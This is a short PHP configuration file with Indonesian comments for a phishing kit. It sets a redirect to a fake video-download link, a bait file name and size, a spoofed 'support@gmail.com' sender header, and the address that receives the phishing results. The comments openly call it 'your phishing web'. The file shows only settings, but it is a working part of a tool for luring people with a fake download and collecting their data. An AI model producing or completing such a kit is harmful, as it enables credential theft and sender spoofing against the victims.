<?php

$redirect = 'https://xnxx.health/'; // LINK DOWNLOAD VIDEO
$namavideo = 'Nama File'; // NAMA WEB PHISING MU
$download = '10,1MB'; // UKURAN DOWNLOAD

$sender = 'From: WEB HANZ KECE🤩😜 <support@gmail.com>'; // NAMA RESULT MU
$email = "emailmu@gmail.com"; // GANTI EMAIL MU

?>